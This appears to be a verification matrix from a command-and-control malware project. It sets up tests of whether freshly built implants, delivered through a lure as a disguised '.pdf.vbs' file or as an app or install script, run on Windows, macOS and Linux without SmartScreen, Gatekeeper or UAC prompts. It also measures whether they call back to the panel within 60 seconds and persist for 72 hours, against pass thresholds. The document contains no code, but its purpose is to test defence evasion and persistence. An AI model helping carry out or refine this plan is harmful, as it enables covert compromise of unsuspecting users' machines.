# Verification matrix

This file defines exactly how the durability claim is measured, per SPEC §9.
`REPORT.md` reports the numbers this produces.

## Targets

| os | version | arch | fresh builds | notes |
|---|---|---|---|---|
| windows | 11 24H2 | amd64 | 20 | Defender defaults, cloud protection ON |
| macos | 15 | arm64 | 10 | Gatekeeper default |
| macos | 14 | amd64 | 10 | Gatekeeper default |
| linux | Ubuntu 24.04 | amd64 | 10 | GNOME, xdg-open present |
| linux | Fedora 41 | amd64 | 10 | GNOME |
| linux | Debian 12 | amd64 | 10 | GNOME |

A "fresh build" = one `panel` build with a fresh random suffix, fresh XOR key
(windows loader), and a fresh implant. No two attempts share an artifact.

## Procedure per attempt

1. Build on the teamserver, download the artifact through the lure or `dl.`.
2. Install the way a user would: Windows double-click the `.pdf.vbs`; macOS
   unzip + open the `.app`; Linux `tar xzf && ./install.sh`.
3. Record the row (below) at install time and again at 24h / 48h / 72h.

## Recorded fields (CSV: `verify/attempts.csv`)

```
date,target,attempt,executed,no_dialog,session_60s,alive24,alive48,alive72,notes
```

- `executed` — implant process started? (y/n)
- `no_dialog` — no SmartScreen/Gatekeeper/UAC prompt that the user must accept? (y/n)
- `session_60s` — a session appeared in the panel within 60s of execution? (y/n)
- `alive24` / `alive48` / `alive72` — session (or a re-registered session) present
  at that age? (y/n)
- `notes` — free text (cause + mitigation if a metric is under threshold)

## Pass thresholds

| metric | threshold |
|---|---|
| execution | ≥ 90% |
| zero dialogs | ≥ 90% |
| session ≤ 60s | ≥ 90% |
| alive at 24h | ≥ 85% |
| alive at 72h | ≥ 70% |

Any metric under threshold → `REPORT.md` names the cause and the mitigation.

## Scoring

```
python verify/tally.py verify/attempts.csv
```

prints per-target percentages and `PASS`/`FAIL` against each threshold, and an
overall verdict.

## Per-OS run notes

- `run_windows.md`, `run_mac.md`, `run_linux.md`
